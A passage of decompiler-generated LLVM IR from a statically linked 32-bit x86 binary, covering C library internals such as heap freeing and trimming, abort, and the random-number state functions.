  br i1 %v1_804ae9b, label %dec_label_pc_804aebe, label %dec_label_pc_804ae9d

dec_label_pc_804ae9d:                             ; preds = %dec_label_pc_804ae85
  %v2_804ae9d = inttoptr i32 %v1_804ae45 to i32*
  %v3_804ae9d = load i32, i32* %v2_804ae9d, align 4
  store i32 %v3_804ae9d, i32* @ebp, align 4
  %v2_804aea2 = sub i32 %v1_804ae45, %v3_804ae9d
  store i32 %v2_804aea2, i32* %eax.global-to-local, align 4
  %v1_804aea4 = add i32 %v2_804aea2, 8
  %v2_804aea4 = inttoptr i32 %v1_804aea4 to i32*
  %v3_804aea4 = load i32, i32* %v2_804aea4, align 4
  store i32 %v3_804aea4, i32* @edi, align 4
  %v1_804aea7 = add i32 %v2_804aea2, 12
  %v2_804aea7 = inttoptr i32 %v1_804aea7 to i32*
  %v3_804aea7 = load i32, i32* %v2_804aea7, align 4
  store i32 %v3_804aea7, i32* @edx, align 4
  %v1_804aeaa = add i32 %v3_804aea4, 12
  %v2_804aeaa = inttoptr i32 %v1_804aeaa to i32*
  %v3_804aeaa = load i32, i32* %v2_804aeaa, align 4
  store i32 %v3_804aeaa, i32* @ecx, align 4
  %v12_804aead = icmp eq i32 %v3_804aeaa, %v2_804aea2
  %v1_804aeaf = icmp eq i1 %v12_804aead, false
  br i1 %v1_804aeaf, label %dec_label_pc_804aeed, label %dec_label_pc_804aeb1

dec_label_pc_804aeb1:                             ; preds = %dec_label_pc_804ae9d
  %v1_804aeb1 = add i32 %v3_804aea7, 8
  %v2_804aeb1 = inttoptr i32 %v1_804aeb1 to i32*
  %v3_804aeb1 = load i32, i32* %v2_804aeb1, align 4
  %v15_804aeb1 = icmp eq i32 %v3_804aeb1, %v3_804aeaa
  %v1_804aeb4 = icmp eq i1 %v15_804aeb1, false
  br i1 %v1_804aeb4, label %dec_label_pc_804aeed, label %dec_label_pc_804aeb6

dec_label_pc_804aeb6:                             ; preds = %dec_label_pc_804aeb1
  %v2_804aeb6 = add i32 %v3_804ae9d, %v1_804ae55
  store i32 %v2_804aeb6, i32* @ebx, align 4
  store i32 %v3_804aea7, i32* %v2_804aeaa, align 4
  %v0_804aebb = load i32, i32* @edi, align 4
  %v1_804aebb = load i32, i32* @edx, align 4
  %v2_804aebb = add i32 %v1_804aebb, 8
  %v3_804aebb = inttoptr i32 %v2_804aebb to i32*
  store i32 %v0_804aebb, i32* %v3_804aebb, align 4
  %v0_804aec5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804ae85, %dec_label_pc_804aeb6
  %v1_804aed1 = phi i32 [ %v2_804ae8d, %dec_label_pc_804ae85 ], [ %v0_804aec5.pre, %dec_label_pc_804aeb6 ]
  %v1_804aec2 = and i32 %v3_804ae90, -4
  store i32 %v1_804aec2, i32* @ebp, align 4
  %v1_804aec5 = load i32, i32* @global_var_805462c.38, align 4
  %v12_804aec5 = icmp eq i32 %v1_804aed1, %v1_804aec5
  br i1 %v12_804aec5, label %dec_label_pc_804af1f, label %dec_label_pc_804aecd

dec_label_pc_804aecd:                             ; preds = %dec_label_pc_804aebe
  %v2_804aecd = add i32 %v1_804aed1, 4
  %v3_804aecd = add i32 %v2_804aecd, %v1_804aec2
  %v4_804aecd = inttoptr i32 %v3_804aecd to i32*
  %v5_804aecd = load i32, i32* %v4_804aecd, align 4
  store i32 %v5_804aecd, i32* %eax.global-to-local, align 4
  %v3_804aed1 = inttoptr i32 %v2_804aecd to i32*
  store i32 %v1_804aec2, i32* %v3_804aed1, align 4
  %v0_804aed4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aed4 = urem i32 %v0_804aed4, 2
  %v2_804aed4 = icmp eq i32 %v1_804aed4, 0
  store i32 %v1_804aed4, i32* %eax.global-to-local, align 4
  %v1_804aed9 = icmp eq i1 %v2_804aed4, false
  br i1 %v1_804aed9, label %dec_label_pc_804aefa, label %dec_label_pc_804aedb

dec_label_pc_804aedb:                             ; preds = %dec_label_pc_804aecd
  %v0_804aedb = load i32, i32* @esi, align 4
  %v1_804aedb = add i32 %v0_804aedb, 8
  %v2_804aedb = inttoptr i32 %v1_804aedb to i32*
  %v3_804aedb = load i32, i32* %v2_804aedb, align 4
  store i32 %v3_804aedb, i32* @edx, align 4
  %v1_804aede = add i32 %v0_804aedb, 12
  %v2_804aede = inttoptr i32 %v1_804aede to i32*
  %v3_804aede = load i32, i32* %v2_804aede, align 4
  store i32 %v3_804aede, i32* %eax.global-to-local, align 4
  %v1_804aee1 = add i32 %v3_804aedb, 12
  %v2_804aee1 = inttoptr i32 %v1_804aee1 to i32*
  %v3_804aee1 = load i32, i32* %v2_804aee1, align 4
  store i32 %v3_804aee1, i32* @edi, align 4
  %v12_804aee4 = icmp eq i32 %v3_804aee1, %v0_804aedb
  %v1_804aee6 = icmp eq i1 %v12_804aee4, false
  br i1 %v1_804aee6, label %dec_label_pc_804aeed, label %dec_label_pc_804aee8

dec_label_pc_804aee8:                             ; preds = %dec_label_pc_804aedb
  %v1_804aee8 = add i32 %v3_804aede, 8
  %v2_804aee8 = inttoptr i32 %v1_804aee8 to i32*
  %v3_804aee8 = load i32, i32* %v2_804aee8, align 4
  %v15_804aee8 = icmp eq i32 %v3_804aee8, %v3_804aee1
  br i1 %v15_804aee8, label %dec_label_pc_804aef2, label %dec_label_pc_804aeed

dec_label_pc_804aeed:                             ; preds = %dec_label_pc_804ae9d, %dec_label_pc_804aee8, %dec_label_pc_804aedb, %dec_label_pc_804aeb1
  %v0_804aeed = call i32 @abort()
  store i32 %v0_804aeed, i32* %eax.global-to-local, align 4
  %v1_804aef2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804aef2

dec_label_pc_804aef2:                             ; preds = %dec_label_pc_804aee8, %dec_label_pc_804aeed
  %v1_804aef2 = phi i32 [ %v3_804aedb, %dec_label_pc_804aee8 ], [ %v1_804aef2.pre, %dec_label_pc_804aeed ]
  %v0_804aef2 = phi i32 [ %v3_804aede, %dec_label_pc_804aee8 ], [ %v0_804aeed, %dec_label_pc_804aeed ]
  %v2_804aef2 = add i32 %v1_804aef2, 12
  %v3_804aef2 = inttoptr i32 %v2_804aef2 to i32*
  store i32 %v0_804aef2, i32* %v3_804aef2, align 4
  %v0_804aef5 = load i32, i32* @ebx, align 4
  %v1_804aef5 = load i32, i32* @ebp, align 4
  %v2_804aef5 = add i32 %v1_804aef5, %v0_804aef5
  store i32 %v2_804aef5, i32* @ebx, align 4
  %v0_804aef7 = load i32, i32* @edx, align 4
  %v1_804aef7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aef7 = add i32 %v1_804aef7, 8
  %v3_804aef7 = inttoptr i32 %v2_804aef7 to i32*
  store i32 %v0_804aef7, i32* %v3_804aef7, align 4
  br label %dec_label_pc_804aefa

dec_label_pc_804aefa:                             ; preds = %dec_label_pc_804aecd, %dec_label_pc_804aef2
  %v0_804aefa = load i32, i32* @global_var_805463c.56, align 4
  store i32 %v0_804aefa, i32* %eax.global-to-local, align 4
  %v0_804aeff = load i32, i32* @ecx, align 4
  %v1_804aeff = add i32 %v0_804aeff, 12
  %v2_804aeff = inttoptr i32 %v1_804aeff to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804aeff, align 4
  %v0_804af06 = load i32, i32* @ebx, align 4
  %v1_804af06 = load i32, i32* @ecx, align 4
  %v3_804af06 = add i32 %v1_804af06, %v0_804af06
  %v4_804af06 = inttoptr i32 %v3_804af06 to i32*
  store i32 %v0_804af06, i32* %v4_804af06, align 4
  %v0_804af09 = load i32, i32* %eax.global-to-local, align 4
  %v1_804af09 = load i32, i32* @ecx, align 4
  %v2_804af09 = add i32 %v1_804af09, 8
  %v3_804af09 = inttoptr i32 %v2_804af09 to i32*
  store i32 %v0_804af09, i32* %v3_804af09, align 4
  %v0_804af0c = load i32, i32* @ecx, align 4
  %v1_804af0c = load i32, i32* %eax.global-to-local, align 4
  %v2_804af0c = add i32 %v1_804af0c, 12
  %v3_804af0c = inttoptr i32 %v2_804af0c to i32*
  store i32 %v0_804af0c, i32* %v3_804af0c, align 4
  %v0_804af0f = load i32, i32* @ebx, align 4
  %v1_804af11 = or i32 %v0_804af0f, 1
  store i32 %v1_804af11, i32* %eax.global-to-local, align 4
  %v0_804af14 = load i32, i32* @ecx, align 4
  store i32 %v0_804af14, i32* @global_var_805463c.56, align 4
  %v2_804af1a = add i32 %v0_804af14, 4
  %v3_804af1a = inttoptr i32 %v2_804af1a to i32*
  store i32 %v1_804af11, i32* %v3_804af1a, align 4
  br label %dec_label_pc_804af2f

dec_label_pc_804af1f:                             ; preds = %dec_label_pc_804aebe
  %v0_804af1f = load i32, i32* @ebx, align 4
  %v2_804af1f = add i32 %v0_804af1f, %v1_804aec2
  store i32 %v2_804af1f, i32* @ebx, align 4
  %v1_804af23 = or i32 %v2_804af1f, 1
  store i32 %v1_804af23, i32* %eax.global-to-local, align 4
  %v1_804af26 = load i32, i32* @ecx, align 4
  %v2_804af26 = add i32 %v1_804af26, 4
  %v3_804af26 = inttoptr i32 %v2_804af26 to i32*
  store i32 %v1_804af23, i32* %v3_804af26, align 4
  %v0_804af29 = load i32, i32* @ecx, align 4
  store i32 %v0_804af29, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804af2f

dec_label_pc_804af2f:                             ; preds = %dec_label_pc_804aefa, %dec_label_pc_804af1f
  %v0_804af2f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804af2f, 131072
  br i1 %tmp, label %dec_label_pc_804af94, label %dec_label_pc_804af37

dec_label_pc_804af37:                             ; preds = %dec_label_pc_804af2f
  %v0_804af37 = load i8, i8* @global_var_8054600.37, align 512
  %v1_804af37 = and i8 %v0_804af37, 2
  %v2_804af37 = icmp eq i8 %v1_804af37, 0
  br i1 %v2_804af37, label %dec_label_pc_804af50, label %dec_label_pc_804af40

dec_label_pc_804af40:                             ; preds = %dec_label_pc_804af37
  %v2_804af48 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804af48, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af50

dec_label_pc_804af50:                             ; preds = %dec_label_pc_804af37, %dec_label_pc_804af40
  %v0_804af50 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804af50, i32* %eax.global-to-local, align 4
  %v1_804af55 = add i32 %v0_804af50, 4
  %v2_804af55 = inttoptr i32 %v1_804af55 to i32*
  %v3_804af55 = load i32, i32* %v2_804af55, align 4
  %v1_804af58 = and i32 %v3_804af55, -4
  store i32 %v1_804af58, i32* %eax.global-to-local, align 4
  %v1_804af5b = load i32, i32* @global_var_8054944.54, align 4
  %v7_804af5b = icmp ult i32 %v1_804af58, %v1_804af5b
  br i1 %v7_804af5b, label %dec_label_pc_804af94, label %dec_label_pc_804af63

dec_label_pc_804af63:                             ; preds = %dec_label_pc_804af50
  %v0_804af63 = load i32, i32* @global_var_8054948.52, align 8
  store i32 %v0_804af63, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  %v0_804af6d = call i32 @__malloc_trim()
  store i32 %v0_804af6d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af94

dec_label_pc_804af74:                             ; preds = %dec_label_pc_804ae7c
  %v2_804af74 = inttoptr i32 %v1_804ae45 to i32*
  %v3_804af74 = load i32, i32* %v2_804af74, align 4
  %v0_804af77 = load i32, i32* @global_var_8054950.45, align 16
  %v1_804af77 = add i32 %v0_804af77, -1
  store i32 %v1_804af77, i32* @global_var_8054950.45, align 16
  %v2_804af7d = add i32 %v3_804af74, %v1_804ae55
  store i32 %v2_804af7d, i32* %eax.global-to-local, align 4
  %v2_804af80 = sub i32 %v1_804ae45, %v3_804af74
  %v0_804af86 = load i32, i32* @global_var_8054964.49, align 4
  %v2_804af86 = sub i32 %v0_804af86, %v2_804af7d
  store i32 %v2_804af86, i32* @global_var_8054964.49, align 4
  %v4_804af8c = call i32 @munmap(i32 %v2_804af80, i32 %v2_804af7d, i32 %v1_804ae55, i32 %v1_804ae55)
  store i32 %v4_804af8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af94

dec_label_pc_804af94:                             ; preds = %dec_label_pc_804af50, %dec_label_pc_804af2f, %dec_label_pc_804af63, %dec_label_pc_804ae5c, %dec_label_pc_804af74
  store i32 %v2_804ae2f, i32* @eax, align 4
  %v2_804af9d = call i32 @__pthread_return_void(i32 %v2_804ae2f, i32 1)
  store i32 %v2_804af9d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afa5

dec_label_pc_804afa5:                             ; preds = %entry, %dec_label_pc_804af94
  %.0 = phi i32 [ undef, %entry ], [ %v2_804af9d, %dec_label_pc_804af94 ]
  store i32 %v0_804ae14, i32* @ebx, align 4
  store i32 %v0_804ae13, i32* @esi, align 4
  store i32 %v0_804ae12, i32* @edi, align 4
  store i32 %v0_804ae11, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804af74, { 1, 0 }
  uselistorder i32 %v0_804af06, { 1, 0 }
  uselistorder i32 %v1_804aed4, { 1, 0 }
  uselistorder i32 %v2_804aecd, { 1, 0 }
  uselistorder i32 %v1_804aec2, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804aed1, { 1, 0 }
  uselistorder i32 %v1_804ae55, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804ae4d, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ae45, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 12, 10, 11, 13, 14, 15, 16, 17, 18, 21, 22, 19, 20, 23, 24, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* bitcast (i8* @global_var_8054600.37 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8054634.40 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805462c.38, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804afa5, { 1, 0 }
  uselistorder label %dec_label_pc_804af94, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804af50, { 1, 0 }
  uselistorder label %dec_label_pc_804af2f, { 1, 0 }
  uselistorder label %dec_label_pc_804aefa, { 1, 0 }
  uselistorder label %dec_label_pc_804aef2, { 1, 0 }
  uselistorder label %dec_label_pc_804aeed, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804aebe, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804afad = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804afba = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8054600.37 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  %v0_804afc7 = load i32, i32* @ebx, align 4
  store i32 %v0_804afc7, i32* @eax, align 4
  store i32 %v0_804afad, i32* @ebx, align 4
  %v0_804afca = call i32 @__malloc_trim()
  ret i32 %v0_804afca

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8054600.37 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 3, 1, 2, 4 }
  uselistorder i8* @global_var_8054600.37, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804afdc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  %v12_804afe6 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afeb

dec_label_pc_804afeb:                             ; preds = %dec_label_pc_804afeb.dec_label_pc_804afeb_crit_edge, %entry
  %v0_804afeb = phi i32 [ %v12_804afe6, %entry ], [ %v0_804afeb.pre, %dec_label_pc_804afeb.dec_label_pc_804afeb_crit_edge ]
  %v1_804aff619 = phi i32 [ 31, %entry ], [ %v1_804aff6, %dec_label_pc_804afeb.dec_label_pc_804afeb_crit_edge ]
  %v2_804afeb = mul i32 %v1_804aff619, 4
  %v3_804afeb = add i32 %v2_804afeb, 152
  %v4_804afeb = add i32 %v3_804afeb, %v0_804afeb
  %v5_804afeb = inttoptr i32 %v4_804afeb to i32*
  store i32 0, i32* %v5_804afeb, align 4
  %v0_804aff6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804aff6 = add i32 %v0_804aff6.pre, -1
  %v9_804aff6 = icmp slt i32 %v1_804aff6, 0
  store i32 %v1_804aff6, i32* %eax.global-to-local, align 4
  %v1_804aff7 = icmp eq i1 %v9_804aff6, false
  br i1 %v1_804aff7, label %dec_label_pc_804afeb.dec_label_pc_804afeb_crit_edge, label %dec_label_pc_804aff9

dec_label_pc_804afeb.dec_label_pc_804afeb_crit_edge: ; preds = %dec_label_pc_804afeb
  %v0_804afeb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804afeb

dec_label_pc_804aff9:                             ; preds = %dec_label_pc_804afeb
  %v0_804aff9 = load i32, i32* @ebx, align 4
  %v2_804affd = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804affd, i32* @ebx, align 4
  %v4_804b005 = call i32 @__sigaddset(i32 %v2_804affd, i32 6, i32 %v0_804aff9, i32 %v0_804aff9)
  store i32 %v4_804b005, i32* %eax.global-to-local, align 4
  %v1_804b00d = icmp eq i32 %v4_804b005, 0
  %v1_804b00f = icmp eq i1 %v1_804b00d, false
  br i1 %v1_804b00f, label %dec_label_pc_804b01f, label %dec_label_pc_804b011

dec_label_pc_804b011:                             ; preds = %dec_label_pc_804aff9
  %v0_804b011 = load i32, i32* @ecx, align 4
  %v4_804b017 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v5_804b017 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_804b017, i32 0, i32 %v0_804b011)
  store i32 %v5_804b017, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b01f

dec_label_pc_804b01f:                             ; preds = %dec_label_pc_804aff9, %dec_label_pc_804b011
  %v2_804b0574 = phi i32 [ %v4_804b005, %dec_label_pc_804aff9 ], [ %v5_804b017, %dec_label_pc_804b011 ]
  %v0_804b01f = load i8, i8* @global_var_8052500.58, align 256
  %v1_804b01f = icmp eq i8 %v0_804b01f, 0
  %v1_804b026 = icmp eq i1 %v1_804b01f, false
  br i1 %v1_804b026, label %dec_label_pc_804b057, label %dec_label_pc_804b028

dec_label_pc_804b028:                             ; preds = %dec_label_pc_804b01f
  store i8 1, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804b02f

dec_label_pc_804b02f:                             ; preds = %dec_label_pc_804b096, %dec_label_pc_804b028
  %v1_804b037 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804b037, i32* %eax.global-to-local, align 4
  %v1_804b043 = call i32 @__raise(i32 6)
  store i32 %v1_804b043, i32* %eax.global-to-local, align 4
  %v1_804b04f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804b04f, i32* %eax.global-to-local, align 4
  %v0_804b057.pre = load i8, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804b057

dec_label_pc_804b057:                             ; preds = %dec_label_pc_804b01f, %dec_label_pc_804b02f
  %v2_804b057 = phi i32 [ %v2_804b0574, %dec_label_pc_804b01f ], [ %v1_804b04f, %dec_label_pc_804b02f ]
  %v0_804b057 = phi i8 [ %v0_804b01f, %dec_label_pc_804b01f ], [ %v0_804b057.pre, %dec_label_pc_804b02f ]
  %v1_804b057 = zext i8 %v0_804b057 to i32
  %v3_804b057 = and i32 %v2_804b057, -256
  %v4_804b057 = or i32 %v1_804b057, %v3_804b057
  store i32 %v4_804b057, i32* %eax.global-to-local, align 4
  %v10_804b05c = icmp eq i8 %v0_804b057, 1
  %v1_804b05e = icmp eq i1 %v10_804b05c, false
  br i1 %v1_804b05e, label %dec_label_pc_804b0b8, label %dec_label_pc_804b060

dec_label_pc_804b060:                             ; preds = %dec_label_pc_804b057
  %v2_804b068 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804b068, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8052500.58, align 256
  %v3_804b074 = bitcast i32* %stack_var_-272 to i8*
  %v4_804b074 = call i32 @__GI_memset(i8* %v3_804b074, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b08b

dec_label_pc_804b08b:                             ; preds = %dec_label_pc_804b08b.dec_label_pc_804b08b_crit_edge, %dec_label_pc_804b060
  %v0_804b08b = phi i32 [ %v12_804afe6, %dec_label_pc_804b060 ], [ %v0_804b08b.pre, %dec_label_pc_804b08b.dec_label_pc_804b08b_crit_edge ]
  %v1_804b09318 = phi i32 [ 31, %dec_label_pc_804b060 ], [ %v1_804b093, %dec_label_pc_804b08b.dec_label_pc_804b08b_crit_edge ]
  %v2_804b08b = mul i32 %v1_804b09318, 4
  %v3_804b08b = add i32 %v2_804b08b, 16
  %v4_804b08b = add i32 %v3_804b08b, %v0_804b08b
  %v5_804b08b = inttoptr i32 %v4_804b08b to i32*
  store i32 -1, i32* %v5_804b08b, align 4
  %v0_804b093.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804b093 = add i32 %v0_804b093.pre, -1
  %v9_804b093 = icmp slt i32 %v1_804b093, 0
  store i32 %v1_804b093, i32* %eax.global-to-local, align 4
  %v1_804b094 = icmp eq i1 %v9_804b093, false
  br i1 %v1_804b094, label %dec_label_pc_804b08b.dec_label_pc_804b08b_crit_edge, label %dec_label_pc_804b096

dec_label_pc_804b08b.dec_label_pc_804b08b_crit_edge: ; preds = %dec_label_pc_804b08b
  %v0_804b08b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b08b

dec_label_pc_804b096:                             ; preds = %dec_label_pc_804b08b
  store i32 %v2_804b068, i32* %eax.global-to-local, align 4
  %v4_804b0ab = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804b0ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b02f

dec_label_pc_804b0b8:                             ; preds = %dec_label_pc_804b057
  %v10_804b0b8 = icmp eq i8 %v0_804b057, 2
  %v1_804b0ba = icmp eq i1 %v10_804b0b8, false
  br i1 %v1_804b0ba, label %dec_label_pc_804b0c4, label %dec_label_pc_804b0bc

dec_label_pc_804b0bc:                             ; preds = %dec_label_pc_804b0b8
  store i8 3, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804b0c4

dec_label_pc_804b0c4:                             ; preds = %dec_label_pc_804b0b8, %dec_label_pc_804b0bc
  %v0_804b0c4 = phi i8 [ %v0_804b057, %dec_label_pc_804b0b8 ], [ 3, %dec_label_pc_804b0bc ]
  %v9_804b0c4 = icmp eq i8 %v0_804b0c4, 3
  %v1_804b0cb = icmp eq i1 %v9_804b0c4, false
  br i1 %v1_804b0cb, label %dec_label_pc_804b0de, label %dec_label_pc_804b0cd

dec_label_pc_804b0cd:                             ; preds = %dec_label_pc_804b0c4
  store i8 4, i8* @global_var_8052500.58, align 256
  %v1_804b0d9 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804b0de:                             ; preds = %dec_label_pc_804b0c4, %dec_label_pc_804b0de
  br label %dec_label_pc_804b0de

; uselistorder directives
  uselistorder i32 %v1_804b093, { 2, 1, 0 }
  uselistorder i8 %v0_804b057, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804aff6, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i8* @global_var_8052500.58, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804b0de, { 1, 0 }
  uselistorder label %dec_label_pc_804b0c4, { 1, 0 }
  uselistorder label %dec_label_pc_804b057, { 1, 0 }
  uselistorder label %dec_label_pc_804b01f, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804b0f2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b0f2, i32* @ebx, align 4
  %v2_804b0f7 = call i32 @__pthread_return_void(i32 %v2_804b0f2, i32 134526883)
  %v1_804b103 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v2_804b10a = ptrtoint i32* %stack_var_-8 to i32
  %v3_804b114 = call i32 @__GI_random_r(i32* nonnull @global_var_805208c, i32 %v2_804b10a)
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804b11e = call i32 @__pthread_return_void(i32 %v2_804b0f2, i32 1)
  %v3_804b123 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_804b123
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804b13d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b13d, i32* @eax, align 4
  %v2_804b142 = call i32 @__pthread_return_void(i32 %v2_804b13d, i32 134526883)
  %v1_804b14e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v0_804b153 = load i32, i32* bitcast (i32** @global_var_8052094.62 to i32*), align 4
  store i32 %v0_804b153, i32* @ebx, align 4
  %v3_804b164 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805208c)
  %v2_804b16c = icmp slt i32 %v3_804b164, 0
  br i1 %v2_804b16c, label %dec_label_pc_804b173, label %dec_label_pc_804b170

dec_label_pc_804b170:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_8052090.63 to i32), i32* @esi, align 4
  br label %dec_label_pc_804b173

dec_label_pc_804b173:                             ; preds = %entry, %dec_label_pc_804b170
  store i32 %v2_804b13d, i32* @eax, align 4
  %v2_804b17c = call i32 @__pthread_return_void(i32 %v2_804b13d, i32 1)
  %v0_804b184 = load i32, i32* @esi, align 4
  ret i32 %v0_804b184

; uselistorder directives
  uselistorder label %dec_label_pc_804b173, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_804b198 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b198, i32* @ebx, align 4
  %v2_804b19d = call i32 @__pthread_return_void(i32 %v2_804b198, i32 134526883)
  %v1_804b1a9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  store i32 ptrtoint (i32** @global_var_8052090.63 to i32), i32* @esi, align 4
  %v4_804b1c8 = inttoptr i32 %arg2 to i32*
  %v5_804b1c8 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804b1c8, i32 %arg3, i32 ptrtoint (i32* @global_var_805208c to i32))
  store i32 %v5_804b1c8, i32* @eax, align 4
  %v2_804b1d3 = call i32 @__pthread_return_void(i32 %v2_804b198, i32 1)
  %v0_804b1db = load i32, i32* @esi, align 4
  ret i32 %v0_804b1db
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b1e0 = load i32, i32* @ebx, align 4
  store i32 %v0_804b1e0, i32* %stack_var_-4, align 4
  %v2_804b1ee = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804b1ee, i32* @ebx, align 4
  %v2_804b1f3 = call i32 @__pthread_return_void(i32 %v2_804b1ee, i32 134526883)
  %v1_804b1ff = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v3_804b20f = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805208c)
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804b219 = call i32 @__pthread_return_void(i32 %v2_804b1ee, i32 1)
  %v2_804b221 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b221, i32* @ebx, align 4
  ret i32 %v2_804b219

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805208c to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805208c, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_804b227 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_804b233 = add i32 %tmp3, 12
